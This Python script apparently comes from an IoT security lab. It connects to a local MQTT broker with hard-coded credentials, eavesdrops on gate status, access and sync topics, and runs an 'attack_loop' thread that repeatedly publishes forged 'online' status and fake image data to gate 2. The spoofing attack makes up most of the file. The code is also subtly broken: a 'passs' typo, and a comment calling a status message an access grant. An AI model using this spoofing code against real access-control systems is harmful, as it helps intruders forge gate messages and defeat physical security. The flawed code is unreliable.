import time
import paho.mqtt.client as mqtt

import threading
import json

BROKER = "localhost"
PORT = 1883
USERNAME = "mqtt_iot2"  # Replace with actual username
PASSWORD = "mah-iot2"  # Replace with actual password

TOPIC_GATE_STATUS = "gate/+/status"
TOPIC_GATE_ACCESS = "gate/+/access"
TOPIC_GATE_SYNC = "gate/+/sync"
TOPIC_SERVER_RESPONSE = "server/response/+"

def on_connect(client, userdata, flags, rc, properties=None):
    print("Connected with result code " + str(rc))
    client.subscribe(TOPIC_GATE_ACCESS)
    client.subscribe(TOPIC_GATE_STATUS)
    client.subscribe(TOPIC_GATE_SYNC)
    client.subscribe(TOPIC_SERVER_RESPONSE)
    print(f"Subscribed to {TOPIC_SERVER_RESPONSE}")
    print(f"Subscribed to {TOPIC_GATE_ACCESS}")
    print(f"Subscribed to {TOPIC_GATE_STATUS}")
    print(f"Subscribed to {TOPIC_GATE_SYNC}")

def on_message(client, userdata, msg):
    print("----- MQTT MESSAGE -----")
    print(f"Topic   : {msg.topic}")
    print(f"QoS     : {msg.qos}")
    print(f"Retain  : {msg.retain}")
    print(f"Payload : {msg.payload}")
    print(f"Received message on {msg.topic}: {msg.payload.decode()}")
    
def attack_loop():
    attacker = mqtt.Client()
    attacker.username_pw_set(USERNAME, PASSWORD)
    attacker.connect(BROKER, PORT)
    attacker.loop_start()
    
    try:
        while True:
            # Send fake access grant
            payload = {
                "status": "online"
            }
            attacker.publish("gate/2/status", payload=json.dumps(payload), qos=1)
            time.sleep(10)
            
            # Send fake image data
            image=""
            payload = {
                 "image": image,
            }
            attacker.publish("gate/2/access", payload=json.dumps(payload), qos=1)
            time.sleep(30)
    except KeyboardInterrupt:
        passs

    attacker.loop_stop()
    attacker.disconnect()

def main():
    client = mqtt.Client(callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
    client.on_connect = on_connect
    client.on_message = on_message

    client.username_pw_set(USERNAME, PASSWORD)  # Set authentication credentials
    client.connect(BROKER, PORT)
    client.loop_start()
    attack_thread = threading.Thread(target=attack_loop, daemon=True)
    attack_thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    client.loop_stop()
    client.disconnect()

if __name__ == "__main__":
    main()